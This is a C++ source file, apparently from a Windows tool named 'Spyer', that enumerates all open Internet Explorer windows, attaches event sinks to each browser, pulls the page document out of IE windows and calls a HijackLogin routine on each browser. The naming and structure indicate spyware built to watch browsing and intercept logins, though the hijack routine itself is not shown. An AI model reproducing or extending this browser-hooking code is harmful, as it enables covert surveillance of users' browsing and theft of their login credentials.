// Spyer.cpp : Manage sinks
//

#include "stdafx.h"
#include "Spyer.h"
#include "IESink.h"
#include "IEHelper.h"
#include "SzgswHijackSink.h"

#include <oleacc.h>
#include <afxctl.h>

#pragma comment (lib, "oleacc")

using namespace iehelper;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

namespace spyer {

CSpyer* CSpyer::_instance = NULL;

HRESULT CSpyer::AddIESink(IWebBrowser2* pWebBrowser2, CIESink* pSink)
{
	if (!pSink) return E_INVALIDARG;
	// add IE sink to all IE browsers
	if (!pWebBrowser2)
	{
		CComPtr<IShellWindows> spShellWin;
		HRESULT hr = spShellWin.CoCreateInstance(CLSID_ShellWindows);
		if (FAILED(hr)) return hr;

		long nCount = 0;
		// get instances count (both Explorer & IExplorer)
		spShellWin->get_Count(&nCount);

		for(int i = 0; i < nCount; i++)
		{
			CComPtr<IDispatch> spDispIE;
			hr = spShellWin->Item(CComVariant((long)i), &spDispIE);
			if (FAILED (hr)) continue;

			CComQIPtr<IWebBrowser2> spWebBrowser2 = spDispIE;
			if (!spWebBrowser2) continue;
			hr = AddIESink(spWebBrowser2, pSink);
			HijackLogin(spWebBrowser2);
		}
		return hr;
	}

	// TODO: here should recursive to add sink to frames
	EVENT_SINK es;
	LPDISPATCH pSinkDisp = pSink->GetIDispatch(TRUE);
	BOOL br = AfxConnectionAdvise(pWebBrowser2, DIID_DWebBrowserEvents2, pSinkDisp, FALSE, &es.dwCookie);
	if (br)
	{
		es.pUnkSink = pSinkDisp;
		es.pUnkSrc = pWebBrowser2;
		es.iid = DIID_DWebBrowserEvents2;
		this->AddSink(es);
	}
	return (br) ? S_OK : E_UNEXPECTED;
}

BOOL CALLBACK EnumIEWindow(HWND hWnd, LPARAM lParam)
{
	TCHAR szClassName[256];
	GetClassName(hWnd,  szClassName,  sizeof(szClassName));

	if (_tcscmp(szClassName, _T("Internet Explorer_Server")) == 0)
	{
		*(HWND*)lParam = hWnd;
		return FALSE;
	}
	return TRUE;
}

HWND SearchWindowEx(HWND hwndParent, HWND hwndChildAfter, LPCTSTR lpszClass, LPCTSTR lpszWindow)
{
	HWND hWnd = NULL, htWnd;
	TCHAR szClassName[256];
	do {
		hWnd = FindWindowEx(hwndParent, hwndChildAfter, NULL, NULL);
		if (!hWnd) return NULL;
		GetClassName(hWnd,  szClassName,  sizeof(szClassName));
		if (_tcscmp(szClassName,  lpszClass) == 0) return hWnd;
		else {
			htWnd = SearchWindowEx(hWnd, NULL, lpszClass, lpszWindow);
			if (htWnd) return htWnd;
		}
		hwndChildAfter = hWnd;
	} while(hWnd);
	return NULL;
}

HRESULT CSpyer::AddIESink(HWND hWnd, CIESink* pSink)
{
	if (!pSink) return E_INVALIDARG;
	if (!hWnd) return AddIESink((IWebBrowser2*)NULL, pSink);
	if (!IsWindow(hWnd)) return E_INVALIDARG;

	HWND hDocViewWnd = NULL;
	long interval = 250;
	long timeout = 5000;
	long total = 0;

	// Must add this interval, otherwise can not find the DocView window, because it is not been created at this time!
	TCHAR szClassName[256];
	GetClassName(hWnd,  szClassName,  sizeof(szClassName));
	// If the created top window is not an IExplore window, just return, or other window will be impacted by the searching!
	if (_tcscmp(szClassName,  "IEFrame") != 0) return E_UNEXPECTED;

	while (hDocViewWnd == NULL && total < timeout) 
	{
		Sleep(interval);
		EnumChildWindows(hWnd, EnumIEWindow, (LPARAM)&hDocViewWnd);
		// hDocViewWnd = SearchWindowEx(hWnd, NULL, _T("Internet Explorer_Server"), NULL);
		total += interval;
	}

	if (hDocViewWnd)
	{
		UINT nMsg = RegisterWindowMessage(_T("WM_HTML_GETOBJECT"));
		LRESULT lRes;
		SendMessageTimeout(hDocViewWnd, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes);

		CComPtr<IHTMLDocument2> pHTMLDocument2 = NULL;
		// ObjectFromLresult can only get IID_IHTMLDocument2 object, no way to get IID_IWebBrowser2 objects!!!
		// Requirements
		//  Windows NT/2000/XP/Server 2003: Included in Windows XP and Windows Server 2003.
		//  Windows 95/98/Me: Unsupported.
		//  Redistributable: Requires Active Accessibility 2.0 RDK on Windows NT 4.0 SP6 and Windows 98.
		//  Header: Declared in Oleacc.h.
		//  Library: Use Oleacc.lib.
		HRESULT hr = ObjectFromLresult (lRes, IID_IHTMLDocument2, 0 , (LPVOID*)&pHTMLDocument2);
		if (FAILED(hr) || !pHTMLDocument2) return hr;

		IWebBrowser2* pWebBrowser2 = GetWebBrowser2(pHTMLDocument2);
		return this->AddIESink(pWebBrowser2, pSink);
	}
	return E_UNEXPECTED;
}

HRESULT CSpyer::AddSink(EVENT_SINK eventSink)
{
	pair<EVENT_SINK_MAP::iterator, bool> retPair = 
		m_eventSinks.insert(EVENT_SINK_PAIR(eventSink.pUnkSink, eventSink));
	return (retPair.second) ? S_OK : E_OUTOFMEMORY;
}

HRESULT CSpyer::RemoveAllSinks()
{
	EVENT_SINK_MAP::iterator it;
	for(it = m_eventSinks.begin(); it != m_eventSinks.end(); ++it)
	{
		RemoveSink((*it).first, (*it).second);
	}
	m_eventSinks.clear();
	return S_OK;
}

HRESULT CSpyer::RemoveSink(LPVOID pSink)
{
	HRESULT hr = S_OK;
	EVENT_SINK_MAP::iterator it = m_eventSinks.find(pSink);
	if (it != m_eventSinks.end())
	{
		EVENT_SINK es = (*it).second;
		hr = RemoveSink(pSink, es);
	}
	return hr;
}

HRESULT CSpyer::RemoveSink(LPVOID pSink, EVENT_SINK es)
{
	HRESULT hr = S_OK;
	if(es.dwCookie > 0 && es.pUnkSink)
	{
		hr = AtlUnadvise(es.pUnkSrc, es.iid, es.dwCookie);
	}
	return hr;
}

}